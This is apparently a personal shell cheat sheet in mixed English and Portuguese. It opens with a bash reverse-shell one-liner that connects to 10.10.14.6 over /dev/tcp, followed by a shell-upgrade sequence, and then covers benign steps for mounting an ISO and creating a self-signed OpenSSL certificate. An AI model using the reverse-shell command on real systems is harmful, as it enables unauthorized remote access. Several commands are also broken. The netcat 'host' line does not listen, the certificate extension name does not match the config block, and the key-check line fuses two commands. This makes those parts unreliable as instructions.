#### Basic rev shell
```bash
# On guest
$ bash -c 'bash -i >& /dev/tcp/10.10.14.6/4545 0>&1'

# On host
nc -nv 10.10.14.6 4545
```
#### Upgrade a rev shell
```sh
$ python -c 'import pty; pty.spawn("/bin/bash")'
^Z

$ stty raw -echo; fg
$ stty rows 50 columns 200
$ export TERM=linux
$ exec /bin/bash
```
#### Mount a image on Linux
```sh
$ sudo mkdir /mnt/mountpoint
$ sudo mount -o loop ./chal_tiny_usb.iso /mnt/mountpoint
```
#### Certificado auto assinado
```sh
$ vim /etc/ssl/openssl.cnf
[ wsc.local ]
subjectAltName = DNS:www.wsc.local

$ openssl genrsa -aes128 2048 > server.key 
$ openssl rsa -in server.key -out server.key 

# Removendo a senha da chave
$ openssl rsa -in server.key -out server.key

# Criando a requisição(CSR)
$ openssl req -utf8 -new -key server.key -out server.csr

# Assinando o certificado
$ openssl x509 -in server.csr -out server.crt -req -signkey server.key -extfile /etc/ssl/openssl.cnf -extensions srv.world -days 3650
```
#### Testa se uma chave pertence ao certificado
```sh
$ openssl x509 -noout -modulus -in /etc/ssl/ldap/ldap.crt | openssl md5 openssl rsa -noout -modulus -in /etc/ssl/ldap/ldap.key | openssl md5
```




openssl s_client -showcerts -connect 10.0.10.10:443










